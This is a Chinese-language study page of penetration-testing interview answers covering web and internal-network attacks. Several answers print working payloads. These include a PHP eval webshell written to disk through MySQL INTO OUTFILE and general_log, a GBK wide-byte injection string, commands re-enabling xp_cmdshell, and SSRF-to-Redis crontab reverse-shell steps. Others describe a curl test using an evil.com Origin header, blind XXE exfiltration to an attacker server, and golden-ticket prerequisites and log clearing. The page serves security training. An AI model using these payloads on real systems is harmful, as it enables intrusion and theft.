<h2 id="53-PHPadmin写shell的方法？"><a href="#53-PHPadmin写shell的方法？" class="headerlink" title="53.PHPadmin写shell的方法？"></a>53.PHPadmin写shell的方法？</h2><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">一、常规导入 shell 的操作</span><br><span class="language-xml">创建数据表导出 shell</span><br><span class="language-xml">CREATE TABLE `mysql`.`shadow9` (`content` TEXT NOT NULL );</span><br><span class="language-xml">INSERT INTO `mysql`.`shadow9` (`content` ) VALUES (‘</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> </span><br><span class="language-php">@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[pass]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">’);</span><br><span class="language-xml">SELECT `content` FROM `shadow9` INTO OUTFILE </span><br><span class="language-xml">‘C:\\phpStudy\\WWW\\90sec.php’;</span><br><span class="language-xml">DROP TABLE IF EXISTS `shadow9`;</span><br><span class="language-xml"></span><br><span class="language-xml">二、一句话导出shell：</span><br><span class="language-xml">select &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[pass]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27; into outfile &#x27;c:/phpstu</span><br><span class="language-xml">dy/www/90sec.php&#x27;;</span><br><span class="language-xml">select &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[pass]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27; into outfile &#x27;c:\\phpst</span><br><span class="language-xml">udy\\www\\90sec.php&#x27;;</span><br><span class="language-xml">select &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[pass]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27; into dumpfile &#x27;c:\\phps</span><br><span class="language-xml">tudy\\www\\bypass.php&#x27;;</span><br><span class="language-xml"></span><br><span class="language-xml">三、日志备份获取 shell</span><br><span class="language-xml">show global variables like &quot;%genera%&quot;; //查询general_</span><br><span class="language-xml">log配置</span><br><span class="language-xml">set global general_log=&#x27;on&#x27;; //开启 general log 模 式</span><br><span class="language-xml">SET global general_log_file=&#x27;D:/phpStudy/WWW/cmd.php&#x27;; //设</span><br><span class="language-xml">置日志文件保存路径</span><br><span class="language-xml">SELECT &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;; //phpinfo()写入日志</span><br><span class="language-xml">文件</span><br><span class="language-xml">set global general_log=&#x27;off&#x27;; //关闭 general_log模 式</span><br></code></pre></td></tr></table></figure>

<h2 id="54-预编译能不能百分百防御SQL注入？如不能请举例"><a href="#54-预编译能不能百分百防御SQL注入？如不能请举例" class="headerlink" title="54.预编译能不能百分百防御SQL注入？如不能请举例"></a>54.预编译能不能百分百防御SQL注入？如不能请举例</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$pdo</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&#x27;SET NAMES gbk&#x27;</span>);<br><span class="hljs-variable">$var</span> = <span class="hljs-string">&quot;\xbf\x27 OR 1=1 /*&quot;</span>;<br><span class="hljs-variable">$query</span> = <span class="hljs-string">&#x27;SELECT * FROM test WHERE name = ? LIMIT 1&#x27;</span>;<br><span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$pdo</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-variable">$query</span>);<br><span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$var</span>));   <span class="hljs-comment">#类似于宽字节注入</span><br><span class="hljs-variable">$dbh</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-string">&quot;txf&quot;</span>);<br><span class="hljs-variable">$name</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$dbh</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">&#x27;SELECT * FROM &#x27;</span> . <span class="hljs-variable">$name</span> . <span class="hljs-string">&#x27; where usern</span><br><span class="hljs-string">ame = :username&#x27;</span>);<br><span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>( <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;:username&#x27;</span> =&gt; <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;username&#x27;</span>])<br>);<br><span class="hljs-comment">#参数 name 是一串数组，PDO 不会生效</span><br><span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$dbh</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">&#x27;SELECT * FROM foo ORDER BY :userSuppliedData&#x27;</span>);<br><span class="hljs-comment">#PDO对DDL不生效</span><br></code></pre></td></tr></table></figure>

<h2 id="55-SQL注入时-and-or-被过滤怎办？"><a href="#55-SQL注入时-and-or-被过滤怎办？" class="headerlink" title="55.SQL注入时 and or 被过滤怎办？"></a>55.SQL注入时 and or 被过滤怎办？</h2><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-number">1</span>.大小写变形<br><span class="hljs-number">2</span>.编码<br><span class="hljs-number">3</span>.添加注释<br><span class="hljs-number">4</span>.双写法<br><span class="hljs-number">5</span>.利用符号形式<br><span class="hljs-number">6</span>.浮点数    <span class="hljs-meta">#数字被注释</span><br><span class="hljs-number">7</span>.函数替代   <span class="hljs-meta">#符号被注释</span><br></code></pre></td></tr></table></figure>

<h2 id="56-快速找文件下载漏洞？"><a href="#56-快速找文件下载漏洞？" class="headerlink" title="56-快速找文件下载漏洞？"></a>56-快速找文件下载漏洞？</h2><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sas">一般链接形式:<br>download.php?path=<br>down.php?<span class="hljs-keyword">file</span>=<br>data.php?<span class="hljs-keyword">file</span>=<br>download.php?<span class="hljs-keyword">filename</span>=<br><br>或者包含参数:<br><span class="hljs-variable">&amp;Src</span>=<br><span class="hljs-variable">&amp;Inputfile</span>=<br><span class="hljs-variable">&amp;Filepath</span>=<br><span class="hljs-variable">&amp;Path</span>=<br><span class="hljs-variable">&amp;Data</span>=<br></code></pre></td></tr></table></figure>

<h2 id="57-任意文件下载的防范方法？"><a href="#57-任意文件下载的防范方法？" class="headerlink" title="57-任意文件下载的防范方法？"></a>57-任意文件下载的防范方法？</h2><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs qml">（<span class="hljs-number">1</span>）过滤<span class="hljs-string">&quot;.&quot;</span>，使用户在<span class="hljs-built_in">url</span>中不能回溯上级目录<br>（<span class="hljs-number">2</span>）正则严格判断用户输入参数的格式<br>（<span class="hljs-number">3</span>）php.ini 配置open_basedir限定文件访问范围<br></code></pre></td></tr></table></figure>

<h2 id="58-CORS产生利用方式？绕过同源策略方式？"><a href="#58-CORS产生利用方式？绕过同源策略方式？" class="headerlink" title="58-CORS产生利用方式？绕过同源策略方式？"></a>58-CORS产生利用方式？绕过同源策略方式？</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span>-CORS 全称是”跨域资源共享”（<span class="hljs-keyword">Cross</span>-origin resource sharing）,Origin源未严格，从而造成跨域问题,允许浏览器向跨源服务器，发出<br>XMLHttpRequest请求<br><span class="hljs-number">2</span>-Origin 为*的时候，使用 curl 测试 CORS，<br>curl &lt;url&gt; -H “Origin: https://evil.com” -I<br>再寻找的 api 接口是否有敏感信息泄漏。<br><br><span class="hljs-number">3</span>-同源：协议相同、域名相同、端口相同，绕过同源策略限制的方法：<br><span class="hljs-number">1</span>、document.<span class="hljs-keyword">domain</span> 属性<br><span class="hljs-number">2</span>、片段识别符（URL 后加#号）<br><span class="hljs-number">3</span>、<span class="hljs-keyword">window</span>.name<br><span class="hljs-number">4</span>、跨文档通信 API<br><span class="hljs-number">5</span>、JSONP<br><span class="hljs-number">6</span>、CORS<br><span class="hljs-number">7</span>、WebSockets<br><br><span class="hljs-number">4</span>-jsonp 跨域利用：获取 <span class="hljs-type">JSON</span> 数据并编码发送到远程服务器<br></code></pre></td></tr></table></figure>

<h2 id="59-XSS弹窗函数和常见的XSS绕过策略？"><a href="#59-XSS弹窗函数和常见的XSS绕过策略？" class="headerlink" title="59-XSS弹窗函数和常见的XSS绕过策略？"></a>59-XSS弹窗函数和常见的XSS绕过策略？</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs perl">alert,confirm,prompt 三种函数<br><br>绕过策略：<br><span class="hljs-number">1</span>.大小写混合<br><span class="hljs-number">2</span>.双写<br><span class="hljs-number">3</span>.编码<br><span class="hljs-number">4</span>.fuzz 低频使用标签 &lt;details/<span class="hljs-keyword">open</span>/ontoggle&gt;<br><span class="hljs-number">5</span>.fuzz 低频使用函数 ontoggle 等<br><span class="hljs-number">6</span>.&lt;img/src=<span class="hljs-number">1</span>&gt;<br><span class="hljs-number">7</span>.%0a 或者%0d 绕过<br></code></pre></td></tr></table></figure>

<h2 id="60-SSRF利用Redis写shell"><a href="#60-SSRF利用Redis写shell" class="headerlink" title="60-SSRF利用Redis写shell"></a>60-SSRF利用Redis写shell</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-number">1</span>.SSRF 服务端请求伪造<br>一、对内网扫描，获取 <span class="hljs-keyword">banner</span><br><span class="hljs-keyword"></span>二、攻击运行在内网的应用，主要是使用 GET 参数就可以实现的攻击（比如<br>Struts2，sqli 等）<br>三、利用协议读取本地文件<br>四、云计算环境 AWS Google <span class="hljs-keyword">Cloud </span>环境可以调用内网操作 ECS 的 API<br><br><span class="hljs-number">2</span>.）如 webligic SSRF 漏洞<br>通过 SSRF 的 gopher 协议操作内网的 redis，利用 redis 将反弹 <span class="hljs-keyword">shell </span>写入crontab 定时任务，url 编码，将\r 字符串替换成%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a<br></code></pre></td></tr></table></figure>

<h2 id="61-登录页面可能存在的漏洞？"><a href="#61-登录页面可能存在的漏洞？" class="headerlink" title="61-登录页面可能存在的漏洞？"></a>61-登录页面可能存在的漏洞？</h2><p><img src="https://img-blog.csdnimg.cn/img_convert/568ac011469665ba1c28916775686118.png" srcset="/img/loading.gif" lazyload alt="图片"></p>
<h2 id="62-描述一下第三方应用软件提权方法？"><a href="#62-描述一下第三方应用软件提权方法？" class="headerlink" title="62-描述一下第三方应用软件提权方法？"></a>62-描述一下第三方应用软件提权方法？</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">1</span>、Serv-u 安全性测试（分为有配置文件有修改权限与 servUDaemon<span class="hljs-selector-class">.exe</span> 默认管理员帐号和密码没修改进行提权）<br><span class="hljs-number">2</span>、FlashFXP 安全性测试（攻击者只需通过 webshell 下载 quick.dat、sites.dat、stats.dat这三个文件进行本地替换，就可以用星号查看器直接查看连接密码）<br><span class="hljs-number">3</span>、Gene6 FTP 安全性测试（Gene6 FTP 默认安装路径是 C:\Program Files\Gene6 FTP Server\RemoteAdmin\Remote<span class="hljs-selector-class">.ini</span> 其中 Remote<span class="hljs-selector-class">.ini</span> 是主配置文件，管理员登录的 ip、端口和密码都存储在这。但 Gene6 管理员帐号只充许本地登录。 对于渗透测试人员来讲只需要通过 Webshell 转发端口就可以进行远程连接）<br><span class="hljs-number">4</span>、PcanyWhere 安全性测试（找到pcanywhere 安装目录下面的*<span class="hljs-selector-class">.CIF</span> 直接用工具破解密码就行）<br><span class="hljs-number">5</span>、VNC安全性测试（通过脚本大马读取 VNC 连接密码：<br>HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4\password） <span class="hljs-number">6</span>、Radmin 安全性测试（导出注册表 hash，用 Radmin 的 hash 版连接就行）<br><span class="hljs-number">7</span>、Zend 安全性测试（攻击者只需要通过 webshell对原 ZendExtensionManager.dll重命名，并通过工具重新生成一个来木马 ZendExtensionManager<span class="hljs-selector-class">.dll</span> 让 apche 重启加载。服务器就会被控制）<br><span class="hljs-number">8</span>、启动项安全性测试<br><span class="hljs-number">9</span>、服务替换安全性测试<br><span class="hljs-number">10</span>、Dll 劫持安全性测试（直接用Tools lpk sethc v4.<span class="hljs-number">0</span> 生成 dll马通过 webshell上传到杀毒软件，输入法等管理员常运行exe软件目录，等着dll 劫持）<br><span class="hljs-number">11</span>、Perl安全性测试（低版本可以直接执行系统命令）<br></code></pre></td></tr></table></figure>

<h2 id="63-xpcmdshell禁用了有什么方法提权"><a href="#63-xpcmdshell禁用了有什么方法提权" class="headerlink" title="63-xpcmdshell禁用了有什么方法提权"></a>63-xpcmdshell禁用了有什么方法提权</h2><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sqf">可以通过使用 sp_configure 启用 <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>。有关启用 <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span> 的步骤可参考：<br>用查询分析器,依次执行下面的语句,就可以了.<br>USE master<br><span class="hljs-built_in">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span><br>RECONFIGURE <span class="hljs-keyword">WITH</span> OVERRIDE<br><span class="hljs-built_in">EXEC</span> sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, <span class="hljs-number">1</span><br>RECONFIGURE <span class="hljs-keyword">WITH</span> OVERRIDE<br><span class="hljs-built_in">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">0</span><br>就可以顺利的执行 CMDSHELL 了<br></code></pre></td></tr></table></figure>

<h2 id="64-网站后台Getshell的方法？"><a href="#64-网站后台Getshell的方法？" class="headerlink" title="64-网站后台Getshell的方法？"></a>64-网站后台Getshell的方法？</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql">webshell路径直接上传 <br>数据库备份getshell <br>修改网站上传类型配置拿webshell <br>执行<span class="hljs-keyword">sql</span>语句写入webshell <br>通过数据库拿webshell <br>命令执行拿webshell <br>phpmyadmin写sehll<br></code></pre></td></tr></table></figure>

<h2 id="65-fastjson不出网怎么利用"><a href="#65-fastjson不出网怎么利用" class="headerlink" title="65-fastjson不出网怎么利用"></a>65-fastjson不出网怎么利用</h2><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs gherkin"><span class="hljs-comment">#目前公开已知的poc有两个：com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl org.apache.tomcat.dbcp.dbcp2.BasicDataSource </span><br><br><span class="hljs-comment">#第一种利用方式需要一个特定的触发条件: </span><br>解析JSON的时候需要使用<span class="hljs-keyword">Feature</span>才能触发，参考如下代码：JSONObject.parseObject(sb.toString(), new <span class="hljs-keyword">Feature</span>[] &#123;<span class="hljs-keyword">Feature</span>.SupportNonPublicField&#125;); <br><br><span class="hljs-comment">#第二种利用方式: 则需要应用部署在Tomcat应用环境中，因为Tomcat应用环境自带tomcat-dbcp.jar 对于SpringBoot这种自带Tomcat可以直接以单个jar文件部署的需要在maven中配置tomcat- dbcp。</span><br><br>而且对于不同的Tomcat版本使用的poc也不同：<br>Tomcat 8.0以后使用 <br>org.apache.tomcat.dbcp.dbcp2.BasicDataSource• Tomcat <br>8.0以下使用 org.apache.tomcat.dbcp.dbcp.BasicDataSource<br></code></pre></td></tr></table></figure>

<h2 id="66-遇到XXE盲注怎么办？"><a href="#66-遇到XXE盲注怎么办？" class="headerlink" title="66.遇到XXE盲注怎么办？"></a>66.遇到XXE盲注怎么办？</h2><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmake">如果遇到XXE无回显注入的话，可以选择使用DNS外带和外部参数实体注入 <br><span class="hljs-number">1</span>- 在攻击者自己的公网服务器，准备一个<span class="hljs-keyword">test</span>.dtd通过base64为将读取的内容加密得到的值当作传参值，发送给攻击者的公网服务器 <br><span class="hljs-number">2</span>-受害者那边，通过外部参数实体注入访问攻击者公网服务器下的<span class="hljs-keyword">test</span>.dtd文件 <span class="hljs-number">3</span>-最后看攻击者公网服务器的日志，转码得到受害者服务器的内容<br></code></pre></td></tr></table></figure>

<h1 id="0x02-内网渗透篇"><a href="#0x02-内网渗透篇" class="headerlink" title="0x02.内网渗透篇"></a>0x02.内网渗透篇</h1><h2 id="00-内网渗透的流程"><a href="#00-内网渗透的流程" class="headerlink" title="00-内网渗透的流程"></a>00-内网渗透的流程</h2><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">拿到跳板后，先探测一波内网存活主机，用net <span class="hljs-keyword">user</span> <span class="hljs-title">/domian</span>命令查看跳板机是否在域内，探测存活主机、提权、提取hash、进行横向移动，定位dc位置，查看是否有能直接提权域管的漏洞，拿到dc控制权后进行提权，然后制作黄金票据做好维权，清理一路过来的日志擦擦脚印<br></code></pre></td></tr></table></figure>

<h2 id="01-白银票据与黄金票据的原理？"><a href="#01-白银票据与黄金票据的原理？" class="headerlink" title="01-白银票据与黄金票据的原理？"></a>01-白银票据与黄金票据的原理？</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">金票：在 Kerberos 认证中,Client 通过 <span class="hljs-keyword">AS</span>(身份认证服务)认证后,<span class="hljs-keyword">AS</span> 会给 Client 一个Logon <span class="hljs-keyword">Session</span> Key 和 TGT,而 Logon <span class="hljs-keyword">Session</span> Key 并不会保存在 KDC 中，krbtgt 的NTLM Hash 又是固定的,所以只要得到 krbtgt 的 NTLM Hash，就可以伪造 TGT 和Logon <span class="hljs-keyword">Session</span> Key 来进入下一步 Client 与 TGS 的交互。而已有了金票后,就跳过<span class="hljs-keyword">AS</span> 验证,不用验证账户和密码,所以也不担心域管密码修改<br><br>银票：如果说黄金票据是伪造的 TGT,那么白银票据就是伪造的 ST。在 Kerberos 认证的第三步，Client 带着 ST 和Authenticator3 向 <span class="hljs-keyword">Server</span> 上的某个服务进行请求，<span class="hljs-keyword">Server</span> 接收到 Client 的请求之后,通过自己的 Master Key 解密 ST,从而获得 <span class="hljs-keyword">Session</span> Key。通过 <span class="hljs-keyword">Session</span> Key 解密 Authenticator3,进而验证对方的身份，验证成功就让 Client 访问 <span class="hljs-keyword">server</span> 上的指定服务了。所以我们只需要知道 <span class="hljs-keyword">Server</span> 用户的 Hash 就可以伪造出一个 ST,且不会经过 KDC,但是伪造的门票只对部分服务起作用<br>## 金票和银票的区别<br><br>获取的权限不同<br>认证流程不同<br>加密方式不同<br></code></pre></td></tr></table></figure>

<h2 id="02-针对kerbores的攻击有哪些？"><a href="#02-针对kerbores的攻击有哪些？" class="headerlink" title="02-针对kerbores的攻击有哪些？"></a>02-针对kerbores的攻击有哪些？</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 用户名爆破<br><span class="hljs-bullet">2.</span> 密码喷洒和密码爆破<br><span class="hljs-bullet">3.</span> Kerberoasting<br><span class="hljs-bullet">4.</span> ASRepRoasting<br><span class="hljs-bullet">5.</span> 黄金票据和白银票据<br><span class="hljs-bullet">6.</span> MS14-068<br><span class="hljs-bullet">7.</span> 非约束委派、约束委派、基于资源的约束委派<br><span class="hljs-bullet">8.</span> 票据传递（ptt/ptk/ptc）<br><span class="hljs-bullet">9.</span> mimikatz加密降级攻击(万能钥匙)<br><span class="hljs-bullet">10.</span> 使用恶意的kerberos证书做权限维持<br></code></pre></td></tr></table></figure>

<h2 id="03-黄金票的条件要求？"><a href="#03-黄金票的条件要求？" class="headerlink" title="03-黄金票的条件要求？"></a>03-黄金票的条件要求？</h2><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-number">1.</span>域名称<span class="hljs-punctuation">[</span><span class="hljs-variable">AD</span> <span class="hljs-variable">PowerShell</span>模块：（<span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">ADDomain</span>）<span class="hljs-operator">.</span><span class="hljs-variable">DNSRoot</span><span class="hljs-punctuation">]</span><br><span class="hljs-number">2.</span>域的<span class="hljs-variable">SID</span> 值<span class="hljs-punctuation">[</span><span class="hljs-variable">AD</span> <span class="hljs-variable">PowerShell</span>模块：（<span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">ADDomain</span>）<span class="hljs-operator">.</span><span class="hljs-variable">DomainSID</span><span class="hljs-operator">.</span><span class="hljs-built_in">Value</span><span class="hljs-punctuation">]</span>（就是域成员<span class="hljs-variable">SID</span>值去掉最后的）<br><span class="hljs-number">3.</span>目标服务器的 <span class="hljs-variable">FQDN</span><br><span class="hljs-number">4.</span>可利用的服务<br><span class="hljs-number">5.</span>域的<span class="hljs-variable">KRBTGT</span>账户<span class="hljs-variable">NTLM</span>密码哈希<br><span class="hljs-number">6.</span>需要伪造的用户名<br>一旦攻击者拥有管理员访问域控制器的权限，就可以使用<span class="hljs-variable">Mimikatz</span>来提取<span class="hljs-variable">KRBTGT</span>帐户密码哈希值<br></code></pre></td></tr></table></figure>

<h2 id="04-横向连接方式"><a href="#04-横向连接方式" class="headerlink" title="04-横向连接方式"></a>04-横向连接方式</h2><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-keyword">$IPC</span>、Psexec、WMI、Schtasks、AT、SC、WINRM</span><br></code></pre></td></tr></table></figure>

<h2 id="05-如何获取内网中机器数量"><a href="#05-如何获取内网中机器数量" class="headerlink" title="05-如何获取内网中机器数量"></a>05-如何获取内网中机器数量</h2><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">可以使用命令net <span class="hljs-keyword">user</span> <span class="hljs-title">/domian</span><br>使用扫描器扫一下<br></code></pre></td></tr></table></figure>

<h2 id="06-内网环境不出网怎么办？"><a href="#06-内网环境不出网怎么办？" class="headerlink" title="06-内网环境不出网怎么办？"></a>06-内网环境不出网怎么办？</h2><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-number">1.</span>通过webshell实现内网<span class="hljs-built_in">socket</span>代理<br><span class="hljs-number">2.</span>正向链接<br><span class="hljs-number">3.</span>ssh隧道<br><span class="hljs-number">4.</span>协议不同出网的方式不同，如dns对应dnscat2  tcp对应<br><span class="hljs-number">5.</span>测试是否是特定协议或端口出网<br></code></pre></td></tr></table></figure>

<h2 id="07-kerberos协议认证"><a href="#07-kerberos协议认证" class="headerlink" title="07-kerberos协议认证"></a>07-kerberos协议认证</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Kerberos是一种网络身份认证的协议，协议设计目的是通过使用秘钥加密技<br>术为客户端/服务器应用程序提供强身份验证。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意的读取、修改和插入数据。在以上情况下，Kerberos作为一种可信任的第三方认证服务，通过传统的密码技术执行认证服务。<br><br>Kerberos认证流程：<br>DC，<span class="hljs-keyword">Domain</span> Controller，域控<br>KDC，Key Distribution Center，秘钥分发中心<br>AD，Account <span class="hljs-keyword">Database</span>，账户数据库<br><span class="hljs-keyword">AS</span>，Authentication <span class="hljs-keyword">Server</span>，身份验证服务<br>TGS，Ticket Granting <span class="hljs-keyword">Server</span>，票据授予服务<br>TGT，Ticket Granting Ticket，票据中心授予的票据先去<span class="hljs-keyword">AS</span>身份验证服务，返回身份验证，带着身份验证去TGS拿票据，带着拿<br>回来的票据去服务器。<br></code></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/img_convert/a7f94f0ce00e474ded22543f85981bcb.png" srcset="/img/loading.gif" lazyload alt="图片"></p>
<h2 id="08-mimikatz使用方法"><a href="#08-mimikatz使用方法" class="headerlink" title="08-mimikatz使用方法"></a>08-<strong>mimikatz</strong>使用方法</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">mimikatz是一款强大的系统密码破解获取工具。可以破解哈希值，是一个可加载的Meterpreter模块。<br><br>如果system的权限无法执行执行。需要先进行提权。<br>在meterpreter中输入run post<span class="hljs-regexp">/multi/</span>recon/local_exploit_sugge<br>ster，进行提权漏洞检测。<br></code></pre></td></tr></table></figure>

